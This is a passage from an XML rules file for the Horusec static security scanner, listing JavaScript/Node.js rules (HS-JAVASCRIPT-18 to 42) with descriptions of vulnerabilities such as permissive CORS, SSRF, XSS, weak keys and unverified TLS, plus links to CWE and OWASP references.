      <![CDATA[Hidden files are created automatically by many tools to save user-preferences, well-known examples are .profile, .bashrc, .bash_history or .git. To simplify the view these files are not displayed by default using operating system commands like ls. Outside of the user environment, hidden files are sensitive because they are used to store privacy-related information or even hard-coded secrets. For more information check out the CWE-538 (https://cwe.mitre.org/data/definitions/538.html) and OWASP A6:2017 (https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#statically-serving-hidden-files-is-security-sensitive' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#statically-serving-hidden-files-is-security-sensitive</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#statically-serving-hidden-files-is-security-sensitive' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/538.html' target='_blank'>https://cwe.mitre.org/data/definitions/538.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-18</key>
    <name>Using intrusive permissions With Geolocation</name>
    <description>
      <![CDATA[Powerful features are browser features (geolocation, camera, microphone &#8230;) that can be accessed with JavaScript API and may require a permission granted by the user. These features can have a high impact on privacy and user security thus they should only be used if they are really necessary to implement the critical parts of an application.\n\nThis rule highlights intrusive permissions when requested with the future standard (but currently experimental) web browser query API and specific APIs related to the permission. It is highly recommended to customize this rule with the permissions considered as intrusive in the context of the web application. If geolocation is required, always explain to the user why the application needs it and prefer requesting an approximate location when possible. For more information check out the CWE-250 (https://cwe.mitre.org/data/definitions/250.html) and OWASP A3:2017 (https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#using-intrusive-permissions-with-geolocation' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#using-intrusive-permissions-with-geolocation</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#using-intrusive-permissions-with-geolocation' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/250.html' target='_blank'>https://cwe.mitre.org/data/definitions/250.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-19</key>
    <name>Having a permissive Cross-Origin Resource Sharing policy</name>
    <description>
      <![CDATA[Same origin policy in browsers prevents, by default and for security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port) from its own. The requested target can append additional HTTP headers in response, called CORS, that act like directives for the browser and change the access control policy / relax the same origin policy. The Access-Control-Allow-Origin header should be set only for a trusted origin and for specific resources. For more information checkout the OWASP A6:2017 (https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#having-a-permissive-cross-origin-resource-sharing-policy' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#having-a-permissive-cross-origin-resource-sharing-policy</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#having-a-permissive-cross-origin-resource-sharing-policy' target='_blank'> Rule Docs</a> <br/> <a href='https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html' target='_blank'>https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-20</key>
    <name>Reading the Standard Input</name>
    <description>
      <![CDATA[It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin) can be dangerous and should be validated. Sanitize all data read from the standard input before using it. For more information check out the CWE-20 (https://cwe.mitre.org/data/definitions/20.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#reading-the-standard-input' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#reading-the-standard-input</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#reading-the-standard-input' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/20.html' target='_blank'>https://cwe.mitre.org/data/definitions/20.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-21</key>
    <name>Using command line arguments</name>
    <description>
      <![CDATA[Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized. Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus passing sensitive information via command line arguments should be considered as insecure. This rule raises an issue when on every program entry points (main methods) when command line arguments are used. The goal is to guide security code reviews. Sanitize all command line arguments before using them. For more information check out the CWE-88 (https://cwe.mitre.org/data/definitions/88.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#using-command-line-arguments' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#using-command-line-arguments</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#using-command-line-arguments' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/88.html' target='_blank'>https://cwe.mitre.org/data/definitions/88.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-22</key>
    <name>Redirect to unknown path</name>
    <description>
      <![CDATA[Sanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. This is done often by checking the host of an URL, it is in a set of allowed hosts. For more information check out the CWE-20 (https://cwe.mitre.org/data/definitions/20.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#redirect-to-unknown-path' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#redirect-to-unknown-path</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#redirect-to-unknown-path' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/20.html' target='_blank'>https://cwe.mitre.org/data/definitions/20.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-23</key>
    <name>No render content from request</name>
    <description>
      <![CDATA[Directly using user-controlled objects as arguments to template engines might allow an attacker to do local file reads or even remote code execution. For more information check out the CWE-73 (https://cwe.mitre.org/data/definitions/73.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-render-content-from-request' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-render-content-from-request</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-render-content-from-request' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/73.html' target='_blank'>https://cwe.mitre.org/data/definitions/73.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-24</key>
    <name>No write content from request on HTML</name>
    <description>
      <![CDATA[Writing messages directly to a webpage without sanitization allows a cross-site scripting vulnerability if parts of the message can be influenced by a user. For more information check out the CWE-79 (https://cwe.mitre.org/data/definitions/79.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-write-content-from-request-on-html' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-write-content-from-request-on-html</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-write-content-from-request-on-html' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/79.html' target='_blank'>https://cwe.mitre.org/data/definitions/79.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-25</key>
    <name>Stack trace exposure</name>
    <description>
      <![CDATA[Software developers often add stack traces to error messages, as a debugging aid. Whenever that error message occurs for an end user, the developer can use the stack trace to help identify how to fix the problem. For more information check out the CWE-209 (https://cwe.mitre.org/data/definitions/209.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#stack-trace-exposure' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#stack-trace-exposure</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#stack-trace-exposure' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/209.html' target='_blank'>https://cwe.mitre.org/data/definitions/209.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-26</key>
    <name>Insecure download of executable file</name>
    <description>
      <![CDATA[Downloading executables or other sensitive files over an unencrypted connection can leave a server open to man-in-the-middle attacks (MITM). This attack can allow an attacker to insert arbitrary content into the downloaded file, and in the worst case, allow the attacker to execute arbitrary code on the vulnerable system. For more information check out the CWE-829 (https://cwe.mitre.org/data/definitions/829.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#insecure-download-of-executable-file' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#insecure-download-of-executable-file</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#insecure-download-of-executable-file' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/829.html' target='_blank'>https://cwe.mitre.org/data/definitions/829.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-27</key>
    <name>No use request method using data from request of user input</name>
    <description>
      <![CDATA[Allows user input data to be used as parameters for the &#8216;request&#8217; method. Without proper handling, it could cause a Server Side Request Forgery vulnerability. Which is a type of exploitation in which an attacker abuses the functionality of a server, causing it to access or manipulate information in that server&#8217;s domain. For more information check out the CWE-918 (https://cwe.mitre.org/data/definitions/918.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-request-method-using-data-from-request-of-user-input' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-request-method-using-data-from-request-of-user-input</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-request-method-using-data-from-request-of-user-input' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/918.html' target='_blank'>https://cwe.mitre.org/data/definitions/918.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-28</key>
    <name>No use .get method using data from request of user input</name>
    <description>
      <![CDATA[Allows user input data to be used as parameters for the &#8216;request.get&#8217; method. Without proper handling, it could cause a Server Side Request Forgery vulnerability. Which is a type of exploitation in which an attacker abuses the functionality of a server, causing it to access or manipulate information in that server&#8217;s domain. For more information check out the CWE-918 (https://cwe.mitre.org/data/definitions/918.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-get-method-using-data-from-request-of-user-input' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-get-method-using-data-from-request-of-user-input</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#no-use-get-method-using-data-from-request-of-user-input' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/918.html' target='_blank'>https://cwe.mitre.org/data/definitions/918.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-29</key>
    <name>Cryptographic RSA should be robust</name>
    <description>
      <![CDATA[Most of cryptographic systems require a sufficient key size to be robust against brute-force attacks. n &#8805; 2048 for RSA (n is the key length). For more information check out the CWE-326 (https://cwe.mitre.org/data/definitions/326.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#cryptographic-rsa-should-be-robust' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#cryptographic-rsa-should-be-robust</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#cryptographic-rsa-should-be-robust' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/326.html' target='_blank'>https://cwe.mitre.org/data/definitions/326.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-30</key>
    <name>Cryptographic EC should be robust</name>
    <description>
      <![CDATA[Most of cryptographic systems require a sufficient key size to be robust against brute-force attacks. n &#8805; 224 for ECDH and ECMQV (Examples: secp192r1 is a non-compliant curve (n < 224) but secp224k1 is compliant (n >= 224)). For more information check out the CWE-326 (https://cwe.mitre.org/data/definitions/326.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#cryptographic-ec-should-be-robust' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#cryptographic-ec-should-be-robust</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#cryptographic-ec-should-be-robust' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/326.html' target='_blank'>https://cwe.mitre.org/data/definitions/326.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-31</key>
    <name>JWT should be signed and verified with strong cipher algorithms</name>
    <description>
      <![CDATA[If a JSON Web Token (JWT) is not signed with a strong cipher algorithm (or not signed at all) an attacker can forge it and impersonate user identities. Don&#8217;t use none algorithm to sign or verify the validity of an algorithm. Don&#8217;t use a token without verifying its signature before. For more information check out the CWE-347 (https://cwe.mitre.org/data/definitions/347.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#jwt-should-be-signed-and-verified-with-strong-cipher-algorithms' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#jwt-should-be-signed-and-verified-with-strong-cipher-algorithms</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#jwt-should-be-signed-and-verified-with-strong-cipher-algorithms' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/347.html' target='_blank'>https://cwe.mitre.org/data/definitions/347.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-32</key>
    <name>Server hostnames should be verified during SSL/TLS connections</name>
    <description>
      <![CDATA[To establish a SSL/TLS connection not vulnerable to man-in-the-middle attacks, it&#8217;s essential to make sure the server presents the right certificate. The certificate&#8217;s hostname-specific data should match the server hostname. It&#8217;s not recommended to re-invent the wheel by implementing custom hostname verification. TLS/SSL libraries provide built-in hostname verification functions that should be used.  For more information check out the CWE-297 (https://cwe.mitre.org/data/definitions/297.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#server-hostnames-should-be-verified-during-ssltls-connections' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#server-hostnames-should-be-verified-during-ssltls-connections</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#server-hostnames-should-be-verified-during-ssltls-connections' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/297.html' target='_blank'>https://cwe.mitre.org/data/definitions/297.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-33</key>
    <name>Server certificates should be verified during SSL/TLS connections</name>
    <description>
      <![CDATA[To establish a SSL/TLS connection not vulnerable to man-in-the-middle attacks, it&#8217;s essential to make sure the server presents the right certificate. The certificate&#8217;s hostname-specific data should match the server hostname. It&#8217;s not recommended to re-invent the wheel by implementing custom hostname verification. TLS/SSL libraries provide built-in hostname verification functions that should be used.  For more information check out the CWE-297 (https://cwe.mitre.org/data/definitions/297.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#server-certificates-should-be-verified-during-ssltls-connections' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#server-certificates-should-be-verified-during-ssltls-connections</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#server-certificates-should-be-verified-during-ssltls-connections' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/297.html' target='_blank'>https://cwe.mitre.org/data/definitions/297.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-34</key>
    <name>Untrusted content should not be included</name>
    <description>
      <![CDATA[Including content in your site from an untrusted source can expose your users to attackers and even compromise your own site. For that reason, this rule raises an issue for each non-relative URL. For more information check out the OWASP A1:2017 (https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#untrusted-content-should-not-be-included' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#untrusted-content-should-not-be-included</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#untrusted-content-should-not-be-included' target='_blank'> Rule Docs</a> <br/> <a href='https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html' target='_blank'>https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-35</key>
    <name>Mysql Hard-coded credentials are security-sensitive</name>
    <description>
      <![CDATA[Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true for applications that are distributed or that are open-source. It&#8217;s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", others. For more information check out the CWE-798 (https://cwe.mitre.org/data/definitions/798.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#mysql-hard-coded-credentials-are-security-sensitive' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#mysql-hard-coded-credentials-are-security-sensitive</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#mysql-hard-coded-credentials-are-security-sensitive' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/798.html' target='_blank'>https://cwe.mitre.org/data/definitions/798.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-36</key>
    <name>Using shell interpreter when executing OS commands</name>
    <description>
      <![CDATA[Arbitrary OS command injection vulnerabilities are more likely when a shell is spawned rather than a new process, indeed shell meta-chars can be used (when parameters are user-controlled for instance) to inject OS commands. For more information check out the CWE-78 (https://cwe.mitre.org/data/definitions/78.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#using-shell-interpreter-when-executing-os-commands' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#using-shell-interpreter-when-executing-os-commands</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#using-shell-interpreter-when-executing-os-commands' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/78.html' target='_blank'>https://cwe.mitre.org/data/definitions/78.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-37</key>
    <name>Forwarding client IP address</name>
    <description>
      <![CDATA[Users often connect to web servers through HTTP proxies. Proxy can be configured to forward the client IP address via the X-Forwarded-For or Forwarded HTTP headers. IP address is a personal information which can identify a single user and thus impact his privacy. For more information check out the CWE-78 (https://cwe.mitre.org/data/definitions/78.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#forwarding-client-ip-address' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#forwarding-client-ip-address</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#forwarding-client-ip-address' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/78.html' target='_blank'>https://cwe.mitre.org/data/definitions/78.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-38</key>
    <name>Allowing confidential information to be logged with signale</name>
    <description>
      <![CDATA[Log management is an important topic, especially for the security of a web application, to ensure user activity, including potential attackers, is recorded and available for an analyst to understand what&#8217;s happened on the web application in case of malicious activities. Retention of specific logs for a defined period of time is often necessary to comply with regulations such as GDPR, PCI DSS and others. However, to protect user&#8217;s privacy, certain informations are forbidden or strongly discouraged from being logged, such as user passwords or credit card numbers, which obviously should not be stored or at least not in clear text. For more information check out the CWE-532 (https://cwe.mitre.org/data/definitions/532.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-confidential-information-to-be-logged-with-signale' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-confidential-information-to-be-logged-with-signale</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-confidential-information-to-be-logged-with-signale' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/532.html' target='_blank'>https://cwe.mitre.org/data/definitions/532.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-39</key>
    <name>Allowing browsers to perform DNS prefetching</name>
    <description>
      <![CDATA[By default, web browsers perform DNS prefetching to reduce latency due to DNS resolutions required when an user clicks links from a website page. It can add significant latency during requests, especially if the page contains many links to cross-origin domains. DNS prefetch allows web browsers to perform DNS resolving in the background before the user clicks a link. This feature can cause privacy issues because DNS resolving from the user&#8217;s computer is performed without his consent if he doesn&#8217;t intent to go to the linked website. On a complex private webpage, a combination "of unique links/DNS resolutions" can indicate, to a eavesdropper for instance, that the user is visiting the private page. For more information check out the OWASP A3:2017 (https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-browsers-to-perform-dns-prefetching' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-browsers-to-perform-dns-prefetching</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-browsers-to-perform-dns-prefetching' target='_blank'> Rule Docs</a> <br/> <a href='https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html' target='_blank'>https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-40</key>
    <name>Disabling Certificate Transparency monitoring</name>
    <description>
      <![CDATA[Certificate Transparency (CT) is an open-framework to protect against identity theft when certificates are issued. Certificate Authorities (CA) electronically sign certificate after verifying the identify of the certificate owner. Attackers use, among other things, social engineering attacks to trick a CA to correctly verifying a spoofed identity/forged certificate. CAs implement Certificate Transparency framework to publicly log the records of newly issued certificates, allowing the public and in particular the identity owner to monitor these logs to verify that his identify was not usurped. For more information check out the OWASP A3:2017 (https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#disabling-certificate-transparency-monitoring' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#disabling-certificate-transparency-monitoring</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#disabling-certificate-transparency-monitoring' target='_blank'> Rule Docs</a> <br/> <a href='https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html' target='_blank'>https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-41</key>
    <name>Disabling strict HTTP no-referrer policy</name>
    <description>
      <![CDATA[Confidential information should not be set inside URLs (GET requests) of the application and a safe (ie: different from unsafe-url or no-referrer-when-downgrade) referrer-Policy header, to control how much information is included in the referer header, should be used. For more information check out the OWASP A3:2017 (https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#disabling-strict-http-no-referrer-policy' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#disabling-strict-http-no-referrer-policy</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#disabling-strict-http-no-referrer-policy' target='_blank'> Rule Docs</a> <br/> <a href='https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html' target='_blank'>https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-42</key>
    <name>Allowing browsers to sniff MIME types</name>
    <description>
      <![CDATA[Implement X-Content-Type-Options header with nosniff value (the only existing value for this header) which is supported by all modern browsers and will prevent browsers from performing MIME type sniffing, so that in case of Content-Type header mismatch, the resource is not interpreted. For example within a <script> object context, JavaScript MIME types are expected (like application/javascript) in the Content-Type header. For more information check out the OWASP A6:2017 (https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-browsers-to-sniff-mime-types' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-browsers-to-sniff-mime-types</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-nodejs#allowing-browsers-to-sniff-mime-types' target='_blank'> Rule Docs</a> <br/> <a href='https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html' target='_blank'>https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-JAVASCRIPT-43</key>
    <name>Disabling content security policy frame-ancestors directive</name>
    <description>
